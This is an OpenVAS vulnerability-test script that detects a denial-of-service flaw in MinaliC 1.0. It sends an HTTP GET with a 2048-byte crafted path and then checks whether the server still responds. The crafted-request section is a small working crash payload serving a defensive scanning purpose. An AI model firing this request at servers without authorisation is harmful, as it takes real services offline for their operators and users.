###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_minalic_web_server_dos_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# MinaliC Webserver Denial of Service Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will let the remote unauthenticated attackers to
  cause a denial of service or possibly execute arbitrary code.
  Impact Level: Application";
tag_affected = "MinaliC Webserver MinaliC 1.0";
tag_insight = "The flaw is caused the way minalic webserver handles request with a length
  greater than or equal to 2048 bytes.";
tag_solution = "No solution or patch is available as of 3rd Dec, 2010. Information
  regarding this issue will be updated once the solution details are available.
  For updates refer to http://sourceforge.net/projects/minalic/";
tag_summary = "This host is running MinaliC Webserver and is prone to denial of service
  vulnerability.";

if(description)
{
  script_id(800187);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-09 06:36:39 +0100 (Thu, 09 Dec 2010)");
  script_bugtraq_id(44393);
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"risk_factor", value:"High");
  script_name("MinaliC Webserver Denial of Service Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/68881");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/41982/");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/15334/");

  script_description(desc);
  script_summary("Check MinaliC Webserver is vulnerable by sending crafted pacakets");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (c) 2010 Greenbone Networks GmbH");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl");
  script_require_ports(8080);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:8080);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Confirm the application before trying exploit
banner = get_http_banner(port: port);
if("Server: minaliC" >!< banner){
  exit(0);
}

## Confirm the server is alive and running
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);

if("Server: minaliC" >!< res) {
  exit(0);
}

## Send crafted data to server
craftedData = crap(data:"0x00", length:2048);
req = http_get(item:craftedData, port:port);
res = http_keepalive_send_recv(port:port, data:req);

## Check still server is alive or not, If not then
## server is died and it's vulnerable
req = http_get(item:"/", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if("Server: minaliC" >!< res) {
  security_hole(port);
}
